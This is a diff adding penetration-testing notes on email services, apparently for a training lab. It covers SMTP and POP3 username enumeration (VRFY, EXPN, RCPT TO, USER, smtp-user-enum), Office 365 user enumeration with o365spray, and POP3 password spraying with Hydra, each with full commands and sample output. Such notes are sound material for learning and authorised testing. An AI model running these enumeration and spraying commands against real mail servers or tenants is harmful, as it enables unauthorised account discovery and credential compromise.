@@ -2631,6 +2631,269 @@ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
 
 </details>
 
+<details>
+<summary><h2>Misconfigurations</h2></summary>
+
+Email services rely on authentication to allow users to send and receive emails.
+However, misconfigurations can expose sensitive information or allow abuse.
+
+**Common Misconfiguration**
+
+* Anonymous authentication enabled on the SMTP service.
+* Insecure protocols or commands that can be used to enumerate valid usernames.
+
+**Authentication and User Enumeration**
+
+SMTP supports commands that can be abused to enumerate valid users on a mail server:
+* **VRFY** → Verify if a username/email exists.
+```bash 
+telnet <TARGET_IP> 25
+
+# Trying <TARGET_IP>...
+# Connected to <TARGET_IP>.
+# Escape character is '^]'.
+# 220 parrot ESMTP Postfix (Debian/GNU)
+
+VRFY root
+# 252 2.0.0 root
+
+VRFY www-data
+# 252 2.0.0 www-data
+
+VRFY new-user
+# 550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
+```
+* EXPN → Expand mailing lists into actual usernames.
+```bash 
+telnet <TARGET_IP> 25
+
+# Trying <TARGET_IP>...
+# Connected to <TARGET_IP>.
+# Escape character is '^]'.
+# 220 parrot ESMTP Postfix (Debian/GNU)
+
+EXPN john
+# 250 2.1.0 john@inlanefreight.htb
+
+EXPN support-team
+# 250 2.0.0 carol@inlanefreight.htb
+# 250 2.1.5 elisa@inlanefreight.htb
+```
+* RCPT TO → Used during email delivery; server responses can reveal if a recipient exists.
+```bash 
+telnet <TARGET_IP> 25
+
+# Trying <TARGET_IP>...
+# Connected to <TARGET_IP>.
+# Escape character is '^]'.
+# 220 parrot ESMTP Postfix (Debian/GNU)
+
+MAIL FROM:test@htb.com
+# it is
+# 250 2.1.0 test@htb.com... Sender ok
+
+RCPT TO:julio
+# 550 5.1.1 julio... User unknown
+
+RCPT TO:kate
+# 550 5.1.1 kate... User unknown
+
+RCPT TO:john
+# 250 2.1.5 john... Recipient ok
+```
+* USER → Used followed by the username, and if the server responds OK. This means that the user exists on the server.
+```bash 
+telnet <TARGET_IP> 110
+
+# Trying <TARGET_IP>...
+# Connected to <TARGET_IP>.
+# Escape character is '^]'.
+# +OK POP3 Server ready
+
+USER julio
+# -ERR
+
+USER john
+# +OK
+```
+
+**Automating with `smtp-user-enum`**
+
+Instead of manual testing, use smtp-user-enum to automate enumeration.
+
+```bash 
+smtp-user-enum -M <MODE> -U <USER_LIST> -D <DOMAIN> -t <TARGET_IP>
+```
+```bash 
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+# Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+#  ----------------------------------------------------------
+# |                   Scan Information                       |
+#  ----------------------------------------------------------
+
+# Mode ..................... RCPT
+# Worker Processes ......... 5
+# Usernames file ........... userlist.txt
+# Target count ............. 1
+# Username count ........... 78
+# Target TCP port .......... 25
+# Query timeout ............ 5 secs
+# Target domain ............ inlanefreight.htb
+
+# ######## Scan started at Thu Apr 21 06:53:07 2022 #########
+# 10.129.203.7: jose@inlanefreight.htb exists
+# 10.129.203.7: pedro@inlanefreight.htb exists
+# 10.129.203.7: kate@inlanefreight.htb exists
+# ######## Scan completed at Thu Apr 21 06:53:18 2022 #########
+# 3 results.
+
+# 78 queries in 11 seconds (7.1 queries / sec)
+```
+
+**Enumeration Process**
+
+```mermaid 
+flowchart TD
+    A[Attacker] -->|SMTP VRFY/EXPN/RCPT TO| S[SMTP Server]
+    A -->|POP3 USER| P[POP3 Server]
+    S -->|Response reveals valid users| A
+    P -->|+OK/-ERR responses| A
+    A -->|Automate with smtp-user-enum| S
+```
+
+</details>
+
+<details>
+<summary><h2>Cloud Enumeration</h2></summary>
+
+As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration.
+
+<details>
+<summary><h3>O365 Spray</h3></summary>
+
+[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments).
+
+**Step 1: Validate if our target domain is using Office 365**
+```bash 
+python3 o365spray.py --validate --domain <DOMAIN>
+```
+```bash 
+python3 o365spray.py --validate --domain msplaintext.xyz
+
+#             *** O365 Spray ***            
+
+# >----------------------------------------<
+
+#    > version        :  2.0.4
+#    > domain         :  msplaintext.xyz
+#    > validate       :  True
+#    > timeout        :  25 seconds
+#    > start          :  2025-04-13 09:46:40
+
+# >----------------------------------------<
+
+# [2025-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
+# [2025-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+```
+
+**Step 1: Attempt to identify usernames**
+```bash 
+python3 o365spray.py --enum -U <USERNAME_LIST> --domain <DOMAIN>
+```
+```bash 
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
+                                       
+#             *** O365 Spray ***             
+
+# >----------------------------------------<
+
+#    > version        :  2.0.4
+#    > domain         :  msplaintext.xyz
+#    > enum           :  True
+#    > userfile       :  users.txt
+#    > enum_module    :  office
+#    > rate           :  10 threads
+#    > timeout        :  25 seconds
+#    > start          :  2025-04-13 09:48:03
+
+# >----------------------------------------<
+
+# [2025-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
+# [2025-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+# [2025-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
+# [2025-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
+# [2025-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
+# [2025-04-13 09:48:10,415] INFO : 
+
+# [ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2504130948.txt'
+# [ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2504130948.txt'
+
+# [2025-04-13 09:48:10,416] INFO : Valid Accounts: 2
+
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h2>Password Attacks</h2></summary>
+
+We can use different tools to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack.
+
+Cloud services that support **SMTP**, **POP3**, or **IMAP4** may be vulnerable to password spraying.  
+
+**Common Approaches**
+* **Traditional Tools**
+    * Hydra  ⚠️ Usually blocked by providers  
+
+- **Custom / Specialized Tools**
+    * [o365spray](https://github.com/0xZDH/o365spray) → Microsoft Office 365  
+    * [MailSniper](https://github.com/dafthack/MailSniper) → Microsoft Office 365  
+    * [CredKing](https://github.com/ustayready/CredKing) → Gmail / Okta  
+
+**Important Considerations**
+* Tools must always be **up-to-date**:
+    * Cloud providers frequently change authentication flows and protections  
+    * Outdated tools may fail silently  
+
+* Security professionals should:
+    * Understand **how tools work internally**  
+    * Have the ability to **modify or extend** tools when they break  
+
+
+<details>
+<summary><h3>Hydra - Password Attack</h3></summary>
+
+**Execute hydra against the service**
+```bash 
+hydra -L <USERNAME_LIST> -p '<PASSWORD_LIST>' -f <TARGET_IP> <SERVICE>
+```
+```bash 
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+# Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-13 11:37:46
+# [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+# [DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
+# [DATA] attacking pop3://10.10.110.20:110/
+# [110][pop3] host: 10.129.42.197   login: john   password: Company01!
+# 1 of 1 target successfully completed, 1 valid password found
+
+```
+
+</details>
+
+<details>
+<summary><h3>O365 Spray - Password Spraying</h3></summary>
+
+</details>
+
+</details>
+
 </details>
 
 ---
